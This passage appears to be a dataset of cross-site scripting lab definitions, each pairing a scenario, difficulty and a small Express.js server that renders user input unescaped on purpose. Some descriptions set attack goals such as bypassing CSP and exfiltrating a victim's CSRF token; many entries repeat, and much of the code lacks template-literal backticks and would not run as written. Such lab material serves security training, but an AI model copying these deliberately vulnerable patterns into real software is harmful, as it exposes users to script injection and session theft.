    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n    const userInput = req.query.input || '';\n    res.send(`\n        <h1>Reflected XSS Lab</h1>\n        <p>Your input is reflected in a JavaScript URL:</p>\n        <a href=\"javascript:alert('${userInput}')\">Click here</a>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
   
  },
  {
    "Lab scenario": "Reflected XSS protected by very strict CSP, with dangling markup attack",
    "Lab Description": "This lab using a strict CSP that blocks outgoing requests to external web sites.\nTo solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.\nYou must label your vector with the word \"Click\" in order to induce the simulated user to click it. For example:\n<a href=\"\">Click me</a>\nYou can log in to your own account using the following credentials: wiener:peter",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n    res.set('Content-Security-Policy', \"default-src 'self'; script-src 'self'; connect-src 'self';\");\n    next();\n});\n\napp.get('/', (req, res) => {\n    const userInput = req.query.input || '';\n    res.send(`\n        <h1>Strict CSP Lab</h1>\n        <p>Your input is reflected:</p>\n        <div>${userInput}</div>\n    `);\n});\n\napp.post('/change-email', (req, res) => {\n    const csrfToken = req.headers['x-csrf-token'];\n    if (csrfToken === 'valid-token') {\n        res.send('Email changed to hacker@evil-user.net');\n    } else {\n        res.status(403).send('Invalid CSRF token');\n    }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
    
  },
  {
    "Lab scenario": "Reflected XSS protected by CSP, with CSP bypass",
    "Lab Description": "This lab uses CSP and contains a reflected XSS vulnerability.\nTo solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.\nPlease note that the intended solution to this lab is only possible in Chrome.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n    res.set('Content-Security-Policy', \"default-src 'self'; script-src 'self' 'unsafe-inline';\");\n    next();\n});\n\napp.get('/', (req, res) => {\n    const userInput = req.query.input || '';\n    res.send(`\n        <h1>Reflected XSS with CSP Bypass</h1>\n        <p>Your input is reflected:</p>\n        <div>${userInput}</div>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  


  {
    "Lab scenario": "Reflected XSS in search query parameter",
    "Lab Description": "This lab contains a reflected XSS vulnerability in the search query parameter. The application directly reflects user input without proper encoding. To solve the lab, craft an XSS payload that triggers an alert box.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q || '';\n    res.send(<h1>Search Results</h1><p>Results for: ${query}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user comments section",
    "Lab Description": "This lab allows users to post comments, but it fails to sanitize input before storing it in the database. Attackers can inject malicious JavaScript that executes when other users view the comments.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet comments = [];\n\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/comments', (req, res) => {\n    res.send(comments.map(c => <p>${c}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in URL hash fragment",
    "Lab Description": "The web application dynamically updates the page based on the URL fragment. However, it does not properly sanitize user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in error message",
    "Lab Description": "This application reflects user input directly in an error message, making it vulnerable to reflected XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n    const msg = req.query.msg || 'No error';\n    res.send(<h1>Error Page</h1><p>Error: ${msg}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "XSS via poorly sanitized input in chat messages",
    "Lab Description": "This lab allows users to send messages in a chat system, but it fails to sanitize input, allowing attackers to send JavaScript payloads.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet messages = [];\n\napp.post('/chat', (req, res) => {\n    messages.push(req.body.message);\n    res.send('Message sent!');\n});\n\napp.get('/messages', (req, res) => {\n    res.send(messages.map(m => <p>${m}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in profile description",
    "Lab Description": "Users can update their profile descriptions, but the application fails to sanitize input, allowing attackers to inject persistent JavaScript code.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet profiles = {};\n\napp.post('/update-profile', (req, res) => {\n    profiles[req.body.username] = req.body.description;\n    res.send('Profile updated!');\n});\n\napp.get('/profile', (req, res) => {\n    const description = profiles[req.query.username] || 'No description';\n    res.send(<h1>Profile</h1><p>Description: ${description}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in client-side JavaScript",
    "Lab Description": "The application uses JavaScript to directly insert URL parameters into the page without sanitization, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS via URL parameter",
    "Lab Description": "This lab has a reflected XSS vulnerability in a URL parameter. The application reflects user input directly into the page without sanitization.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/welcome', (req, res) => {\n    const name = req.query.name || 'Guest';\n    res.send(<h1>Welcome, ${name}!</h1>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in forum post",
    "Lab Description": "This lab allows users to create forum posts but does not sanitize input, allowing attackers to inject JavaScript that executes when viewed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet posts = [];\n\napp.post('/post', (req, res) => {\n    posts.push(req.body.content);\n    res.send('Post created!');\n});\n\napp.get('/posts', (req, res) => {\n    res.send(posts.map(p => <p>${p}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in JavaScript-generated content",
    "Lab Description": "The application dynamically updates the page using JavaScript without proper input sanitization, making it vulnerable to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in login error message",
    "Lab Description": "An error message reflects user input without sanitization, making it vulnerable to reflected XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n    const error = req.query.error || '';\n    res.send(<h1>Login Page</h1><p>Error: ${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in search results page",
    "Lab Description": "This lab has a reflected XSS vulnerability in the search functionality. The input is displayed in search results without proper sanitization.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const searchQuery = req.query.q || 'Nothing';\n    res.send(<h1>Search Results</h1><p>You searched for: ${searchQuery}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in guestbook comments",
    "Lab Description": "Users can leave comments in a guestbook, but inputs are stored without sanitization, leading to stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet guestbook = [];\n\napp.post('/guestbook', (req, res) => {\n    guestbook.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/guestbook', (req, res) => {\n    res.send(guestbook.map(c => <p>${c}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in URL hash",
    "Lab Description": "The application reads data from the URL hash and inserts it into the page without sanitization, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "XSS in profile update form",
    "Lab Description": "Users can update their profile information, but input is not sanitized properly, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet users = {};\n\napp.post('/update-profile', (req, res) => {\n    users[req.body.username] = req.body.bio;\n    res.send('Profile updated!');\n});\n\napp.get('/profile', (req, res) => {\n    const bio = users[req.query.username] || 'No bio available';\n    res.send(<h1>Profile</h1><p>Bio: ${bio}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in contact form",
    "Lab Description": "The contact form includes user input in the response without sanitization, leading to a reflected XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n    const name = req.body.name || 'Guest';\n    res.send(<h1>Thank you, ${name}!</h1>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user bio",
    "Lab Description": "Users can set a bio, which is stored and displayed on their profile without sanitization, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet bios = {};\n\napp.post('/set-bio', (req, res) => {\n    bios[req.body.username] = req.body.bio;\n    res.send('Bio updated!');\n});\n\napp.get('/get-bio', (req, res) => {\n    const bio = bios[req.query.username] || 'No bio available';\n    res.send(<h1>User Bio</h1><p>${bio}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in chat widget",
    "Lab Description": "The application updates the chat box using JavaScript but does not escape user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in feedback form",
    "Lab Description": "The feedback page reflects user input without sanitization, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n    const message = req.body.message || 'No message';\n    res.send(<h1>Your feedback: ${message}</h1>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in event descriptions",
    "Lab Description": "Event descriptions are stored in the database and displayed without sanitization, allowing for stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet events = [];\n\napp.post('/create-event', (req, res) => {\n    events.push(req.body.description);\n    res.send('Event created!');\n});\n\napp.get('/events', (req, res) => {\n    res.send(events.map(e => <p>${e}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in email validation",
    "Lab Description": "The email validation form reflects user input in an error message, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/validate-email', (req, res) => {\n    const email = req.query.email || 'Invalid email';\n    res.send(<h1>Email Validation</h1><p>Error: ${email}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in support ticket messages",
    "Lab Description": "Support ticket messages are stored without sanitization, allowing attackers to inject JavaScript that executes when viewed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet tickets = [];\n\napp.post('/submit-ticket', (req, res) => {\n    tickets.push(req.body.message);\n    res.send('Ticket submitted!');\n});\n\napp.get('/view-tickets', (req, res) => {\n    res.send(tickets.map(t => <p>${t}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notification system",
    "Lab Description": "The notification system updates the page dynamically but does not escape input, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in password reset error message",
    "Lab Description": "The password reset page reflects user input in an error message without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/reset-password', (req, res) => {\n    const error = req.query.error || 'Unknown error';\n    res.send(<h1>Password Reset</h1><p>Error: ${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in product reviews",
    "Lab Description": "Product reviews are stored in the database and displayed without sanitization, allowing attackers to inject JavaScript.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet reviews = [];\n\napp.post('/submit-review', (req, res) => {\n    reviews.push(req.body.review);\n    res.send('Review submitted!');\n});\n\napp.get('/reviews', (req, res) => {\n    res.send(reviews.map(r => <p>${r}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in search field",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search field. To solve the lab, inject a payload that executes JavaScript when reflected back on the page.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.get('/search', (req, res) => {\n    const query = req.query.q || '';\n    res.send(<h1>Search Results</h1><p>You searched for: ${query}</p>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user profile",
    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the user profile page. Inject a payload in the profile description and trigger execution when another user views the profile.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet profiles = {};\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/profile', (req, res) => {\n    profiles[req.body.username] = req.body.bio;\n    res.send('Profile updated!');\n});\napp.get('/profile/:user', (req, res) => {\n    res.send(<h1>${req.params.user}'s Profile</h1><p>${profiles[req.params.user] || ''}</p>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in login form",
    "Lab Description": "This lab contains a reflected XSS vulnerability in the login form. The application directly reflects user input without proper encoding. To solve the lab, craft an XSS payload that triggers an alert box.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.post('/login', (req, res) => {\n    const username = req.body.username || '';\n    res.send(<h1>Welcome ${username}</h1>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in password reset field",
    "Lab Description": "The password reset page contains an XSS vulnerability by reflecting user input. Find a way to inject JavaScript through the email parameter.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\napp.get('/reset-password', (req, res) => {\n    const email = req.query.email || '';\n    res.send(<h1>Reset Password</h1><p>Email: ${email}</p>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in profile page",
    "Lab Description": "The web application dynamically updates the profile page based on the URL fragment. However, it does not properly sanitize user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\napp.use(express.static('public'));\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "XSS in file upload preview",
    "Lab Description": "This lab allows users to upload and preview images, but it does not sanitize SVG files properly. Craft an SVG file containing JavaScript to trigger XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\napp.post('/upload', upload.single('file'), (req, res) => {\n    res.send(<img src='/uploads/${req.file.filename}'>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in admin logs",
    "Lab Description": "This lab allows users to report bugs. However, the input is stored and later displayed to an admin without sanitization. Exploit the stored XSS by injecting a script that executes when an admin reviews the logs.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nlet reports = [];\napp.post('/report', (req, res) => {\n    reports.push(req.body.issue);\n    res.send('Bug reported!');\n});\napp.get('/admin/logs', (req, res) => {\n    res.send(reports.map(r => <p>${r}</p>).join(''));\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS bypassing regex filters",
    "Lab Description": "This application attempts to block XSS using a regex filter. However, the filter is incomplete. Inject a payload that bypasses it and executes JavaScript.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit', (req, res) => {\n    let input = req.body.text.replace(/<script>/gi, '');\n    res.send(<div>${input}</div>);\n});\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in error message",
    "Lab Description": "The application displays user input in error messages without proper escaping, leading to a reflected XSS attack.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n    const errorMsg = req.query.msg || 'No error';\n    res.send(<h1>Error Page</h1><p>${errorMsg}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user bios",
    "Lab Description": "Users can set a bio on their profile, but the application does not sanitize input, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet bios = [];\n\napp.post('/bio', (req, res) => {\n    bios.push(req.body.bio);\n    res.send('Bio updated!');\n});\n\napp.get('/bios', (req, res) => {\n    res.send(bios.map(b => <p>${b}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notifications",
    "Lab Description": "User notifications are displayed dynamically in JavaScript without proper sanitization, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in feedback form",
    "Lab Description": "The feedback form echoes back user input in the response page without escaping, allowing reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n    const feedback = req.query.feedback || 'No feedback';\n    res.send(<h1>Feedback Page</h1><p>${feedback}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in private messages",
    "Lab Description": "Private messages are stored and displayed without sanitization, leading to stored XSS vulnerabilities.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet messages = [];\n\napp.post('/message', (req, res) => {\n    messages.push(req.body.message);\n    res.send('Message sent!');\n});\n\napp.get('/messages', (req, res) => {\n    res.send(messages.map(m => <p>${m}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in login error",
    "Lab Description": "The login page displays error messages that include unsanitized user input, allowing reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n    const error = req.query.error || '';\n    res.send(<h1>Login Page</h1><p>${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in event descriptions",
    "Lab Description": "Event descriptions are stored and displayed without escaping, allowing attackers to inject scripts.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet events = [];\n\napp.post('/event', (req, res) => {\n    events.push(req.body.description);\n    res.send('Event added!');\n});\n\napp.get('/events', (req, res) => {\n    res.send(events.map(e => <p>${e}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in social media post preview",
    "Lab Description": "The social media post preview feature displays user input without sanitization, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n    const content = req.query.content || '';\n    res.send(<h1>Post Preview</h1><p>${content}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in admin dashboard logs",
    "Lab Description": "The admin dashboard logs display unsanitized user-generated input, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet logs = [];\n\napp.post('/log', (req, res) => {\n    logs.push(req.body.logEntry);\n    res.send('Log added!');\n});\n\napp.get('/logs', (req, res) => {\n    res.send(logs.map(l => <p>${l}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in API documentation search",
    "Lab Description": "The API documentation search feature reflects user queries without sanitization, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/api-docs', (req, res) => {\n    const search = req.query.q || '';\n    res.send(<h1>API Docs</h1><p>Results for: ${search}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in login error message",
    "Lab Description": "The login page reflects invalid credentials in an error message without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n    const error = req.query.error || '';\n    res.send(<h1>Login</h1><p>${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in forum posts",
    "Lab Description": "Users can create forum posts, but the input is stored and displayed without sanitization, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet posts = [];\n\napp.post('/post', (req, res) => {\n    posts.push(req.body.content);\n    res.send('Post submitted!');\n});\n\napp.get('/posts', (req, res) => {\n    res.send(posts.map(p => <p>${p}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in search bar",
    "Lab Description": "The application updates the search results dynamically using JavaScript, but does not escape user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in user profile preview",
    "Lab Description": "User input in the profile preview is not sanitized before being rendered, allowing for a reflected XSS attack.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/profile-preview', (req, res) => {\n    const name = req.query.name || 'Guest';\n    res.send(<h1>Profile Preview</h1><p>Name: ${name}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in private messages",
    "Lab Description": "Private messages are stored in the database and displayed without sanitization, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet messages = [];\n\napp.post('/send-message', (req, res) => {\n    messages.push(req.body.message);\n    res.send('Message sent!');\n});\n\napp.get('/messages', (req, res) => {\n    res.send(messages.map(m => <p>${m}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notification panel",
    "Lab Description": "The notification panel updates dynamically using JavaScript without escaping input, allowing for a DOM-based XSS attack.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in search autocomplete",
    "Lab Description": "The search autocomplete feature reflects user input without sanitization, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/autocomplete', (req, res) => {\n    const query = req.query.q || '';\n    res.send(<h1>Search Autocomplete</h1><p>${query}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in comment replies",
    "Lab Description": "Replies to comments are stored and displayed without sanitization, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet replies = [];\n\napp.post('/reply', (req, res) => {\n    replies.push(req.body.reply);\n    res.send('Reply submitted!');\n});\n\napp.get('/replies', (req, res) => {\n    res.send(replies.map(r => <p>${r}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in password recovery hint",
    "Lab Description": "The password recovery page displays user input in an error message without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/recover-password', (req, res) => {\n    const hint = req.query.hint || 'No hint available';\n    res.send(<h1>Password Recovery</h1><p>Hint: ${hint}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in blog post titles",
    "Lab Description": "Blog post titles are stored and displayed without sanitization, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
